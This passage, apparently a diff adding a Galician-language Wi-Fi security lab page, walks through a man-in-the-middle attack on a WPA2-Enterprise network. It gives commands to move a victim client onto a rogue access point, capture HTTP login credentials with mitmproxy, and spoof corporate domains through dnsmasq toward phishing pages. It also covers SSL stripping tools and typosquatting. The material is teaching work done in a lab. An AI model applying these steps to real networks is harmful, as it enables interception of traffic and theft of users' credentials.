+</span><span id="__span-30-2"><a href="#__codelineno-30-2" id="__codelineno-30-2" name="__codelineno-30-2"></a>iw<span class="w"> </span>dev<span class="w"> </span>wlan1<span class="w"> </span>link<span class="w">  </span>
+</span></code></pre></div>
+<p><strong>Se conectou ao MITM (ÉXITO):</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a href="#__codelineno-31-1" id="__codelineno-31-1" name="__codelineno-31-1"></a>Connected to XX:XX:XX:XX:XX:XX (on wlan1)
+</span><span id="__span-31-2"><a href="#__codelineno-31-2" id="__codelineno-31-2" name="__codelineno-31-2"></a>SSID: EMPRESA-XYZ
+</span><span id="__span-31-3"><a href="#__codelineno-31-3" id="__codelineno-31-3" name="__codelineno-31-3"></a>freq: 2412 ← Canal 1 (MITM) ✓
+</span></code></pre></div></p>
+<p><strong>Se aínda está no AP lexítimo (repetir desautenticación na Consola 4):</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a href="#__codelineno-32-1" id="__codelineno-32-1" name="__codelineno-32-1"></a>Connected to XX:XX:XX:XX:XX:XX (on wlan1)
+</span><span id="__span-32-2"><a href="#__codelineno-32-2" id="__codelineno-32-2" name="__codelineno-32-2"></a>freq: 2437 ← Canal 6 (AP lexítimo)
+</span></code></pre></div></p>
+<hr/>
+<h3 id="912-renovar-ip-para-a-rede-do-mitm">9.1.2. Renovar IP para a Rede do MITM</h3>
+<p>Unha vez confirmada a migración ao MITM, renovamos a IP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a href="#__codelineno-33-1" id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="c1"># Liberar a IP antiga do AP lexítimo (192.168.50.XX)</span>
+</span><span id="__span-33-2"><a href="#__codelineno-33-2" id="__codelineno-33-2" name="__codelineno-33-2"></a>dhclient<span class="w"> </span>-r<span class="w"> </span>wlan1
+</span><span id="__span-33-3"><a href="#__codelineno-33-3" id="__codelineno-33-3" name="__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a href="#__codelineno-33-4" id="__codelineno-33-4" name="__codelineno-33-4"></a><span class="c1"># Solicitar nova IP do MITM (rede 10.0.0.0/24)</span>
+</span><span id="__span-33-5"><a href="#__codelineno-33-5" id="__codelineno-33-5" name="__codelineno-33-5"></a>dhclient<span class="w"> </span>-v<span class="w"> </span>wlan1
+</span><span id="__span-33-6"><a href="#__codelineno-33-6" id="__codelineno-33-6" name="__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a href="#__codelineno-33-7" id="__codelineno-33-7" name="__codelineno-33-7"></a><span class="c1"># Verificar nova IP asignada polo dnsmasq do MITM</span>
+</span><span id="__span-33-8"><a href="#__codelineno-33-8" id="__codelineno-33-8" name="__codelineno-33-8"></a>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>wlan1
+</span><span id="__span-33-9"><a href="#__codelineno-33-9" id="__codelineno-33-9" name="__codelineno-33-9"></a><span class="c1"># Debe amosar: inet 10.0.0.XX/24 ✓</span>
+</span><span id="__span-33-10"><a href="#__codelineno-33-10" id="__codelineno-33-10" name="__codelineno-33-10"></a>
+</span><span id="__span-33-11"><a href="#__codelineno-33-11" id="__codelineno-33-11" name="__codelineno-33-11"></a><span class="c1"># Verificar nova ruta por defecto</span>
+</span><span id="__span-33-12"><a href="#__codelineno-33-12" id="__codelineno-33-12" name="__codelineno-33-12"></a>ip<span class="w"> </span>route<span class="w"> </span>show
+</span><span id="__span-33-13"><a href="#__codelineno-33-13" id="__codelineno-33-13" name="__codelineno-33-13"></a><span class="c1"># Debe amosar: default via 10.0.0.1 dev wlan1 ✓</span>
+</span></code></pre></div>
+<hr/>
+<h2 id="92-verificar-conectividade-co-mitm">9.2 Verificar Conectividade co MITM</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a href="#__codelineno-34-1" id="__codelineno-34-1" name="__codelineno-34-1"></a><span class="c1"># Ping ao gateway MITM</span>
+</span><span id="__span-34-2"><a href="#__codelineno-34-2" id="__codelineno-34-2" name="__codelineno-34-2"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">10</span>.0.0.1
+</span><span id="__span-34-3"><a href="#__codelineno-34-3" id="__codelineno-34-3" name="__codelineno-34-3"></a><span class="c1"># Debe funcionar ✓</span>
+</span><span id="__span-34-4"><a href="#__codelineno-34-4" id="__codelineno-34-4" name="__codelineno-34-4"></a>
+</span><span id="__span-34-5"><a href="#__codelineno-34-5" id="__codelineno-34-5" name="__codelineno-34-5"></a><span class="c1"># Ping a Internet (a través do NAT do MITM)</span>
+</span><span id="__span-34-6"><a href="#__codelineno-34-6" id="__codelineno-34-6" name="__codelineno-34-6"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">8</span>.8.8.8
+</span><span id="__span-34-7"><a href="#__codelineno-34-7" id="__codelineno-34-7" name="__codelineno-34-7"></a><span class="c1"># Debe funcionar ✓</span>
+</span></code></pre></div>
+<hr/>
+<h2 id="93-xerar-trafico-http-agora-si-interceptado">9.3 Xerar Tráfico HTTP (AGORA SI Interceptado)</h2>
+<p><strong>Agora SI, o tráfico será interceptado por mitmproxy</strong> (se configuraches a Consola 6):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a href="#__codelineno-35-1" id="__codelineno-35-1" name="__codelineno-35-1"></a><span class="c1"># Simular login HTTP con credenciais</span>
+</span><span id="__span-35-2"><a href="#__codelineno-35-2" id="__codelineno-35-2" name="__codelineno-35-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://testphp.vulnweb.com/login.php<span class="w"> </span>-d<span class="w"> </span><span class="s2">"username=test&amp;password=test123"</span>
+</span><span id="__span-35-3"><a href="#__codelineno-35-3" id="__codelineno-35-3" name="__codelineno-35-3"></a>
+</span><span id="__span-35-4"><a href="#__codelineno-35-4" id="__codelineno-35-4" name="__codelineno-35-4"></a><span class="c1"># Tentar HTTPS (mitmproxy converterao a HTTP se é posible)</span>
+</span><span id="__span-35-5"><a href="#__codelineno-35-5" id="__codelineno-35-5" name="__codelineno-35-5"></a>curl<span class="w"> </span>http://www.example.com
+</span></code></pre></div>
+<p>Agora na <strong>Consola 6</strong>, deberían aparecer as credenciais interceptadas:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a href="#__codelineno-36-1" id="__codelineno-36-1" name="__codelineno-36-1"></a>POST http://testphp.vulnweb.com/login.php
+</span><span id="__span-36-2"><a href="#__codelineno-36-2" id="__codelineno-36-2" name="__codelineno-36-2"></a>username=test&amp;password=test123
+</span></code></pre></div>
+<p><img alt="Fig. Captura de credenciais - mitmproxy" src="../images/captura-credenciais-mitmproxy.png"/></p>
+<hr/>
+<h2 id="10-conclusion-e-tecnicas-de-ataque-post-autenticacion">10. Conclusión e Técnicas de Ataque Post-Autenticación</h2>
+<p>O ataque MITM con <code>hostapd-mana</code> en modo <strong>proxy RADIUS</strong> ten vantaxes estratéxicas respecto ao Evil Twin.</p>
+<hr/>
+<h3 id="101-vantaxes-do-mitm-proxy-vs-evil-twin">10.1. Vantaxes do MITM Proxy vs Evil Twin</h3>
+<table>
+<thead>
+<tr>
+<th>Característica</th>
+<th>Evil Twin (P2)</th>
+<th>MITM Proxy (P3)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Captura MSCHAPv2</strong></td>
+<td>✓ Si (hash crackeable)</td>
+<td>✗ Non (só handshakes WPA2)</td>
+</tr>
+<tr>
+<td><strong>Transparencia</strong></td>
+<td>✗ Cliente perde conectividade</td>
+<td>✓ Cliente mantén acceso funcional</td>
+</tr>
+<tr>
+<td><strong>Persistencia</strong></td>
+<td>✗ Ataque puntual</td>
+<td>✓ Interceptación continua</td>
+</tr>
+<tr>
+<td><strong>Captura de Sesións</strong></td>
+<td>✗ Limitado</td>
+<td>✓ Cookies, tokens, credenciais HTTP</td>
+</tr>
+</tbody>
+</table>
+<hr/>
+<h3 id="102-limitacions-tecnicas">10.2. Limitacións Técnicas</h3>
+<p><strong>1. Handshakes WPA2-EAP NON crackeables</strong><br/>
+Como vimos na <strong>Consola 5</strong> (hashcat):<br/>
+- En <strong>WPA2-PSK</strong>: PMK = PBKDF2(contrasinal, SSID) → <strong>Crackeable</strong> ✓<br/>
+- En <strong>WPA2-EAP</strong>: PMK = Derivada do MSK (Master Session Key) → <strong>NON crackeable</strong> ✗  </p>
+<p>O MSK xérao o servidor RADIUS durante a autenticación EAP/PEAP e <strong>NON está relacionado coa contrasinal</strong> do usuario "1234".</p>
+<p><strong>2. Necesidade de técnicas post-autenticación</strong><br/>
+Para capturar credenciais en WPA2-EAP MITM, <strong>debemos usar</strong>:<br/>
+1. <strong>Interceptación de tráfico HTTP</strong> (páx. 20-21 do PDF)<br/>
+2. <strong>DNS Spoofing</strong> (redirixir dominios a servidores falsos)<br/>
+3. <strong>ARP Spoofing</strong> (se hai máis clientes na rede)<br/>
+4. <strong>SSL Stripping</strong> (NON nativo en mitmproxy - require configuración avanzada)  </p>
+<hr/>
+<h3 id="103-tecnicas-de-captura-de-credenciais">10.3. Técnicas de Captura de Credenciais</h3>
+<h4 id="a-interceptacion-http-con-mitmproxy-consola-6">A) Interceptación HTTP con mitmproxy (Consola 6)</h4>
+<p><strong>Limitación de mitmproxy en modo transparente:</strong><br/>
+- <code>mitmproxy --mode transparent</code> <strong>NON fai SSL Stripping automático</strong><br/>
+- Intercepta HTTPS mediante un certificado MITM que o cliente pode rexeitar<br/>
+- <strong>Só captura credenciais en sitios HTTP puros ou con certificados aceptados</strong> </p>
+<p><strong>Alternativas para SSL Stripping real:</strong><br/>
+1. <strong>sslstrip2</strong> (requiere configuración manual con iptables)<br/>
+2. <strong>bettercap</strong> (con módulo <code>http.proxy</code> + <code>dns.spoof</code>)<br/>
+3. <strong>ettercap</strong> con plugins personalizados  </p>
+<h4 id="b-dns-spoofing-consola-3b-namespace-mitm_wlan2">B) DNS Spoofing (Consola 3b - namespace mitm_wlan2)</h4>
+<p>Redirixir dominios lexítimos a páxinas de phishing. O método correcto neste escenario é <strong><code>dnsmasq address=</code></strong>, xa que o cliente usa <code>10.0.0.1</code> como DNS (configurado por DHCP) e as consultas chegan directamente a <code>dnsmasq</code>.</p>
+<blockquote>
+<p>⚠️ <strong>Por que NON usar <code>dnsspoof</code> aquí:</strong> <code>dnsspoof</code> funciona por sniffing de paquetes e require que o tráfico DNS pase pola interface que monitoriza. Se o cliente está configurado para usar <code>10.0.0.1</code> como DNS, as consultas chegan como tráfico unicast directo a <code>dnsmasq</code> — <code>dnsspoof</code> non as captura. Ademais, <code>dnsspoof</code> non actúa como servidor DNS real, polo que as consultas non spoofadas quedan sen resposta.</p>
+</blockquote>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a href="#__codelineno-37-1" id="__codelineno-37-1" name="__codelineno-37-1"></a><span class="c1"># Entrar ao namespace MITM (se non estás xa)</span>
+</span><span id="__span-37-2"><a href="#__codelineno-37-2" id="__codelineno-37-2" name="__codelineno-37-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>mitm_wlan2<span class="w"> </span>bash
+</span><span id="__span-37-3"><a href="#__codelineno-37-3" id="__codelineno-37-3" name="__codelineno-37-3"></a>
+</span><span id="__span-37-4"><a href="#__codelineno-37-4" id="__codelineno-37-4" name="__codelineno-37-4"></a><span class="c1"># Engadir regras de spoofing a dnsmasq en tempo real (sen reiniciar)</span>
+</span><span id="__span-37-5"><a href="#__codelineno-37-5" id="__codelineno-37-5" name="__codelineno-37-5"></a><span class="c1"># address=/dominio/IP redirixe ese dominio á IP do MITM</span>
+</span><span id="__span-37-6"><a href="#__codelineno-37-6" id="__codelineno-37-6" name="__codelineno-37-6"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"address=/login.empresa.com/10.0.0.1"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/dnsmasq-mitm.conf
+</span><span id="__span-37-7"><a href="#__codelineno-37-7" id="__codelineno-37-7" name="__codelineno-37-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"address=/mail.empresa.com/10.0.0.1"</span><span class="w">  </span>&gt;&gt;<span class="w"> </span>/tmp/dnsmasq-mitm.conf
+</span><span id="__span-37-8"><a href="#__codelineno-37-8" id="__codelineno-37-8" name="__codelineno-37-8"></a>
+</span><span id="__span-37-9"><a href="#__codelineno-37-9" id="__codelineno-37-9" name="__codelineno-37-9"></a><span class="c1"># Recargar dnsmasq (SIGHUP aplica os cambios sen cortar o DHCP)</span>
+</span><span id="__span-37-10"><a href="#__codelineno-37-10" id="__codelineno-37-10" name="__codelineno-37-10"></a><span class="nb">kill</span><span class="w"> </span>-HUP<span class="w"> </span><span class="k">$(</span>pgrep<span class="w"> </span>dnsmasq<span class="k">)</span>
+</span></code></pre></div>
+<p><strong>Verificar desde o cliente (Consola 2):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a href="#__codelineno-38-1" id="__codelineno-38-1" name="__codelineno-38-1"></a><span class="c1"># Entrar no namespace do cliente</span>
+</span><span id="__span-38-2"><a href="#__codelineno-38-2" id="__codelineno-38-2" name="__codelineno-38-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>wifi_cliente_wlan1<span class="w"> </span>bash
+</span><span id="__span-38-3"><a href="#__codelineno-38-3" id="__codelineno-38-3" name="__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a href="#__codelineno-38-4" id="__codelineno-38-4" name="__codelineno-38-4"></a><span class="c1"># Verificar que o DNS asignado é o MITM</span>
+</span><span id="__span-38-5"><a href="#__codelineno-38-5" id="__codelineno-38-5" name="__codelineno-38-5"></a>cat<span class="w"> </span>/etc/resolv.conf
+</span><span id="__span-38-6"><a href="#__codelineno-38-6" id="__codelineno-38-6" name="__codelineno-38-6"></a><span class="c1"># Debe amosar: nameserver 10.0.0.1</span>
+</span><span id="__span-38-7"><a href="#__codelineno-38-7" id="__codelineno-38-7" name="__codelineno-38-7"></a>
+</span><span id="__span-38-8"><a href="#__codelineno-38-8" id="__codelineno-38-8" name="__codelineno-38-8"></a><span class="c1"># Verificar o spoofing</span>
+</span><span id="__span-38-9"><a href="#__codelineno-38-9" id="__codelineno-38-9" name="__codelineno-38-9"></a>nslookup<span class="w"> </span>login.empresa.com<span class="w"> </span><span class="m">10</span>.0.0.1
+</span><span id="__span-38-10"><a href="#__codelineno-38-10" id="__codelineno-38-10" name="__codelineno-38-10"></a><span class="c1"># Debe resolver a: 10.0.0.1 (IP do MITM) ✓</span>
+</span><span id="__span-38-11"><a href="#__codelineno-38-11" id="__codelineno-38-11" name="__codelineno-38-11"></a>
+</span><span id="__span-38-12"><a href="#__codelineno-38-12" id="__codelineno-38-12" name="__codelineno-38-12"></a>nslookup<span class="w"> </span>google.com<span class="w"> </span><span class="m">10</span>.0.0.1
+</span><span id="__span-38-13"><a href="#__codelineno-38-13" id="__codelineno-38-13" name="__codelineno-38-13"></a><span class="c1"># Debe resolver normalmente (reenvío a 8.8.8.8) ✓</span>
+</span></code></pre></div></p>
+<h4 id="c-arp-spoofing">C) ARP Spoofing</h4>
+<p>O punto clave é que o atacante xa está “no medio” <strong>sen ARP spoofing</strong>, porque:<br/>
+- O atacante levanta un <strong>AP Rogue</strong> (wlan2) e dá servizo de <strong>DHCP</strong> ao cliente.<br/>
+- O cliente recibe como <strong>gateway</strong> o propio atacante (10.0.0.1).<br/>
+- Polo tanto, todo o tráfico do cliente pasa polo atacante “de forma natural” (MITM por topoloxía), e logo sae a Internet vía NAT.</p>
+<hr/>
+<h3 id="104-limitacions-de-hsts-http-strict-transport-security">10.4. Limitacións de HSTS (HTTP Strict Transport Security)</h3>
+<p><strong>Sitios con HSTS son inmunes a SSL Stripping con mitmproxy:</strong><br/>
+- Exemplo: Google, Facebook, Twitter, GitHub<br/>
+- O navegador <strong>obriga</strong> a usar HTTPS incluso se o MITM tenta redirixir a HTTP<br/>
+- Solución: <strong>Phishing</strong> con dominios similares (typosquatting)  </p>
+<div class="admonition tip">
+<p class="admonition-title">HSTS e Typosquatting: por que importan (e como che afectan no lab)</p>
+<p><strong>HSTS (HTTP Strict Transport Security)</strong> é unha política que un sitio web envía ao navegador para <em>forzar sempre HTTPS</em> durante un tempo. Se un dominio ten HSTS activo, o navegador <strong>non aceptará</strong> o “downgrade” a HTTP, polo que técnicas tipo <em>SSL Stripping</em> deixan de funcionar (no MITM do taller verás que só é viable cando o sitio permite fluxo HTTP→HTTPS e <strong>non</strong> ten HSTS).  </p>
+<p><strong>Typosquatting</strong> é unha técnica de <em>suplantación por erro tipográfico</em>: o atacante rexistra dominios moi parecidos a un lexítimo (p.ex. cambiando unha letra, engadindo un guión, usando outro TLD) para capturar credenciais ou distribuír malware. No contexto dun MITM, adoita combinarse con <em>DNS spoofing</em> para redirixir á vítima a ese dominio “case igual”; por iso, unha defensa clave é <strong>validación estrita de certificados/CA</strong> e boas prácticas de navegación (marcadores, contrasinais con autocompletado só en dominios exactos, e políticas corporativas).</p>
+</div>
+<hr/>
+<h3 id="105-obxectivo-acadado">10.5. Obxectivo Acadado</h3>
+<p>✓ <strong>Interceptación completa</strong> do tráfico da vítima<br/>
+✓ <strong>Captura de credenciais</strong> mediante:  </p>
+<div class="language-text highlight"><pre><span></span><code>- Tráfico HTTP en texto claro  
+- DNS Spoofing a sitios de phishing
+</code></pre></div>
+<p>✓ <strong>Acceso invisible</strong> á rede corporativa<br/>
+✓ <strong>Capacidade de movemento lateral</strong> e ataques internos  </p>
+<p>⚠️ <strong>NON capturamos hash MSCHAPv2</strong> (para iso, usar Evil Twin - Práctica 2)<br/>
+⚠️ <strong>NON crackeamos handshakes WPA2-EAP</strong> (tecnicamente imposible)  </p>
+<hr/>
+<h2 id="11-limpeza">11. Limpeza</h2>
+<p>Ao rematar, apaga o escenario.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a href="#__codelineno-39-1" id="__codelineno-39-1" name="__codelineno-39-1"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>reset
+</span></code></pre></div></p>
+</article>
+</div>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Volver ao principio
+</button>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+<script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+<script src="../../../../js/medium-zoom.min.js"></script>
+<script src="../../../../js/opera.js"></script>
+<script src="../../../../js/zoom.js"></script>
+</body>
+</html>
